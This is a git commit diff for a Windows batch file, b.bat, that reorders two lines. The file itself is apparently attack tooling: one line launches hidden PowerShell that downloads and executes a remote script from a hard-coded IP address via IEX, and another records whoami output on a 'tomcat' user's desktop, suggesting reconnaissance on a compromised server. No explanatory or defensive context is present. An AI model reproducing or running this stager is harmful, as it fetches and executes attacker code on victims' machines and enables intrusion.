40beb71b1519c79ac7dccfe0e5977885daf5b81d
ofswbug <72555151+ofswbug@users.noreply.github.com>
2021-10-21 17:45:42 +0300

    Update b.bat

--- b.bat
+++ b.bat
@@ -1,2 +1,2 @@
-whoami > C:\users\tomcat\desktop\who.txt
 powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://52.29.134.186:80/index.php');"
+whoami > C:\users\tomcat\desktop\who.txt
